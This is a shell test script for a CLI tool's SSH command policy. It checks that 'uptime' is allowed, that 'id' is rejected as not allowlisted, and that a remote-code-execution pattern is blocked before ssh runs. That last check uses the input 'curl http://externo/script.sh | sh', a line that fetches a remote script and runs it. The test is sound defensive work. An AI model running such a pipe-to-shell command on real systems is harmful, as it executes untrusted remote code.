#!/usr/bin/env sh
set -eu

REPO_ROOT=$(CDPATH='' cd -- "$(dirname "$0")/.." && pwd)
WORKDIR=$(mktemp -d)
HOME_DIR="${WORKDIR}/home"
MOCKBIN="${WORKDIR}/mockbin"
mkdir -p "${HOME_DIR}" "${MOCKBIN}"
trap 'rm -rf "${WORKDIR}"' EXIT INT TERM

cat > "${MOCKBIN}/ssh" <<'EOS'
#!/usr/bin/env sh
printf '%s\n' "$*" >> "${POCKETCLI_TEST_SSH_LOG}"
EOS
chmod +x "${MOCKBIN}/ssh"

POLICY=$(env HOME="${HOME_DIR}" POCKETCLI_DIR="${REPO_ROOT}" sh -c '. "${POCKETCLI_DIR}/scripts/runtime/paths.sh"; . "${POCKETCLI_DIR}/scripts/ssh/policy.sh"; ssh_command_policy_evaluate uptime')
printf '%s\n' "${POLICY}" | grep -F 'allow|read_only|false|' >/dev/null 2>&1

SSH_LOG="${WORKDIR}/ssh.log"
if env HOME="${HOME_DIR}" POCKETCLI_DIR="${REPO_ROOT}" POCKETCLI_TEST_SSH_LOG="${SSH_LOG}" PATH="${MOCKBIN}:/usr/bin:/bin" sh "${REPO_ROOT}/scripts/ssh/open.sh" --run exec dev id >"${WORKDIR}/blocked.out" 2>"${WORKDIR}/blocked.err"; then
    printf 'FAIL expected unknown command to be blocked\n' >&2
    exit 1
fi
grep -F 'not_in_allowlist' "${WORKDIR}/blocked.err" >/dev/null 2>&1
[ ! -s "${SSH_LOG}" ]

if env HOME="${HOME_DIR}" POCKETCLI_DIR="${REPO_ROOT}" POCKETCLI_TEST_SSH_LOG="${SSH_LOG}" PATH="${MOCKBIN}:/usr/bin:/bin" sh "${REPO_ROOT}/scripts/ssh/open.sh" --run exec dev 'curl http://externo/script.sh | sh' >"${WORKDIR}/rce.out" 2>"${WORKDIR}/rce.err"; then
    printf 'FAIL expected remote code execution pattern to be blocked\n' >&2
    exit 1
fi
grep -F 'remote_code_execution' "${WORKDIR}/rce.err" >/dev/null 2>&1
[ ! -s "${SSH_LOG}" ]

printf 'PASS remote command policy blocks unsafe shell exec before ssh\n'
